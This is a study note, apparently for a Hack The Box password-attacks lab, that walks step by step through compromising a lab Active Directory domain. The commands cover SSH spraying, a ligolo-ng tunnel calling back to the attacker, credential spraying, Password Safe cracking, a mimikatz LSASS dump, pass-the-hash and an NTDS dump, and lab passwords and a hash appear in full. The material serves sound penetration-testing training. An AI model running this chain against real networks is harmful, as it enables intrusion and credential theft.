# NOTE — Skills Assessment

## ID
532

## Module
Password Attacks

## Kind
lab

## Title
Section 26 — Skills Assessment — Password Attacks

## Description
End-to-end credential-shuffle exam: SSH-spray a DMZ host to gain a foothold, pivot via ligolo-ng to the internal /24, Snaffler the shares, crack a Password Safe DB, dump LSASS for hashes, PtH to a DC, dump NTDS. The full Credential Theft Shuffle.

## Tags
skills-assessment, password-attacks, credential-theft-shuffle, pivoting, ligolo-ng, snaffler, password-safe, mimikatz, ntds, dcsync

## Commands
- `nmap <dmz-external-ip>`
- `./username-anarchy <First> <Last> > user.list`
- `hydra -L user.list -p '<password>' ssh://<dmz-ip>`
- `ssh <user>@<dmz-ip>`
- `grep -r 'pass' /home/ 2>/dev/null`
- `sudo ./proxy -selfcert` (ligolo-ng server, attacker)
- `./agent -connect <attacker>:11601 --ignore-cert` (ligolo-ng agent, DMZ)
- `nxc rdp <hosts> -u <u> -p '<p>'`
- `xfreerdp /v:<ip> /u:<u> /p:'<p>' /dynamic-resolution /drive:linux,.`
- `Snaffler.exe -u -s -n <FQDN>`
- `hashcat -m 5200 <psafe3-file> /usr/share/wordlists/rockyou.txt.gz`
- `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `nxc smb <dc-ip> -u <u> -H <nthash> --ntds --user Administrator`

## Scope
| Host | IP |
|------|------|
| DMZ01 | `10.129.*.*` (external) + `172.16.119.13` (internal) |
| JUMP01 | `172.16.119.7` |
| FILE01 | `172.16.119.10` |
| DC01 | `172.16.119.11` |

## Provided Clue
- Name: **Betty Jayde**
- Known password (suspected reuse): **`Texas123!@#`**
- Goal: NT hash of `NEXURA\Administrator`

## Walkthrough

### 1) External Recon
DMZ01 is the only externally reachable host. Scan it:
```bash
nmap <dmz-external-ip>
```
Only SSH (22) is open.

### 2) Username Generation
No username given — generate common forms for "Betty Jayde":
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Betty Jayde > user.list
```

### 3) SSH Spray
```bash
hydra -L user.list -p 'Texas123!@#' ssh://<dmz-external-ip>
```
Returns `jbetty:Texas123!@#`. Log in:
```bash
ssh jbetty@<dmz-external-ip>
```

### 4) Foothold Cred Hunting
```bash
grep 'pass' -r /home/ 2>/dev/null
```
Bash history reveals: `sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01` — that's a domain user + password (`hwilliam:dealer-screwed-gym1`).

### 5) Pivot via Ligolo-ng
On the attacker host:
```bash
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_*.tar.gz
tar -xvzf ligolo-ng_agent_*.tar.gz
sudo ./proxy -selfcert
```

Upload the agent to DMZ01 (`python3 -m http.server` + `wget` from the SSH session), then:
```bash
chmod +x ./agent
./agent -connect <attacker>:11601 --ignore-cert
```

In the ligolo prompt:
```
ligolo-ng » session       # pick the DMZ session
[Agent : jbetty@DMZ01] » autoroute
# select 172.16.119.13/24, create new interface, start tunnel: Yes
```

### 6) Spray hwilliam Across Internal Hosts
```bash
nxc rdp 172.16.119.7,172.16.119.10,172.16.119.11 -u hwilliam -p 'dealer-screwed-gym1'
```
`hwilliam` is local admin (`Pwn3d!`) on JUMP01 and a regular user on the others.

### 7) RDP into JUMP01 with Folder Sharing
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.
```
The `/drive:linux,.` flag mounts your local CWD inside the RDP session — drop tools straight in.

### 8) Snaffler the Shares
Download `Snaffler.exe` to the shared folder, copy to Desktop on JUMP01, then:
```cmd
Snaffler.exe -u -s -n FILE01.nexura.htb
```
Finds `\\FILE01\HR\Archive\Employee-Passwords_OLD.psafe3` — a Password Safe v3 database.

### 9) Crack the .psafe3
```bash
smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR' -c 'cd Archive; get Employee-Passwords_OLD.psafe3'
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz
```
Master password: `michaeljackson`.

### 10) Read the Vault on the Target
Password Safe 3 is installed on FILE01. Copy the `.psafe3` file there (via the shared linux drive), open Password Safe with the cracked master password. Vault yields:
- `bdavid:caramel-cigars-reply1`
- `stom:fails-nibble-disturb4`

### 11) Spray the New Creds
```bash
nxc winrm 172.16.119.7,172.16.119.10,172.16.119.11 -u bdavid -p 'caramel-cigars-reply1'
```
`bdavid` is local admin on JUMP01 (`Pwn3d!`).

### 12) RDP as bdavid, Dump LSASS
```bash
xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,.
```
Run elevated cmd → `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`.
Among the logon sessions is `stom` — and his NT hash is now in memory.

### 13) Spray stom's Hash
```bash
nxc smb 172.16.119.10,172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa
```
`stom` is local admin on DC01 (`Pwn3d!`) — domain compromise unlocked.

### 14) DCSync the Administrator
```bash
nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator
```
Output line:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — NT hash of `NEXURA\Administrator` | **(hidden — see HTB walkthrough)** | Final `nxc smb ... --ntds --user Administrator` after the full chain above |

## Key Takeaways
- **The Credential Theft Shuffle** in action: each compromised host yields *creds for the next host or a higher-priv account*. Foothold → user → admin → DA → DCSync.
- Pivoting (ligolo-ng) is what makes this assessment moveable — without it, JUMP01/FILE01/DC01 are unreachable.
- A Password Safe master password of `michaeljackson` is the failure point. Cracking the manager file is faster than attacking any service directly.
- Mimikatz on a JUMP host where an admin has recently logged in is a *staple* of real engagements — it doesn't matter that you can't read DC01 directly, the DA logged into JUMP at some point.
- Always check share write permissions — `WRITE` on a non-admin share enables the "Snaffler finds the password file" / "drop a runscript" attack chain.

## Gotchas
- The DMZ host has no internet egress — agents must be uploaded via the SSH session, not pulled by the DMZ box directly.
- `--ignore-cert` is required on ligolo agent against the `-selfcert` proxy. Without it, the agent silently fails to connect.
- `xfreerdp /drive:linux,.` requires the local CWD to be the directory you want shared. Don't `cd` away before launching.
- `xfreerdp` cert prompt: hit **Y** — the default newline accepts nothing and silently drops the connection.
- Snaffler runs from the JUMP host's context (`hwilliam`'s creds), not yours. Different users see different shares; if you don't see expected hits, try as a different user.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[25-password-managers]] | [[00-overview]] →
<!-- AUTO-LINKS-END -->
